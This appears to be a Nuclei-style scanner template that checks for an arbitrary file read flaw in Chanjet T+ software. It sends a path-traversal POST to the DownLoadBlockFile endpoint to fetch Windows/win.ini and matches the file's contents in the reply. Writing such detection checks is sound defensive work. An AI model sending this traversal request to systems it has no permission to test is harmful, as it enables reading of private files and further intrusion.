id: changjietongT-DownLoadBlockFile-fileread

info:
  name: 畅捷通T+ DownLoadBlockFile 存在任意文件读取漏洞
  author: changjietongT
  severity: high
  tags: changjietong,T+,fileread

http:
  - raw:
      - |
        POST /tplus/GLSyncService.asmx/DownLoadBlockFile HTTP/1.1
        Host: {{Hostname}} 
        Content-Type: application/x-www-form-urlencoded
        
        fileName=..%2F..%2F..%2FWindows%2Fwin.ini

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - 'OyBmb3IgMTYtYm'
      - type: status
        status: 
          - 200